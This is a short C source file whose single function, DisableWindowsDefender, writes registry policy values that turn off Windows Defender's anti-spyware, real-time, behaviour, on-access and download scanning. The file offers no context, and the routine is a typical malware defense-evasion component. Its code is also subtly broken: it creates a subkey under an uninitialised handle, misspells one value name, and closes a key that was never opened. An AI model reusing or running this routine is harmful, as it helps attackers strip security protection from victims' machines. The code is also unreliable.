#include <windows.h>
#include "def.h"

//Disable Windows Defender
bool DisableWindowsDefender(void) {
	HKEY pKey;
	HKEY nKey;
	DWORD disable = 1;
	DWORD isOpenRegistry = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
		0,
		KEY_ALL_ACCESS,
		&pKey
	);
	if( isOpenRegistry==ERROR_SUCCESS ){
		RegSetValueEx( pKey, L"DisableAntiSpyWare", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable) );
		RegCreateKeyEx( nKey, L"RealTime Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &nKey, 0 );
		RegSetValueEx( nKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable) );
		RegSetValueEx( nKey, L"DisableBehaviorMonitering", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable) );
		RegSetValueEx( nKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable) );
		RegSetValueEx( nKey, L"DisableOnAccessMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable) );
		RegSetValueEx( nKey, L"DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

		RegCloseKey( nKey );
		RegCloseKey(pKey);
		return TRUE;
	}
	RegCloseKey(pKey);
	return FALSE;
}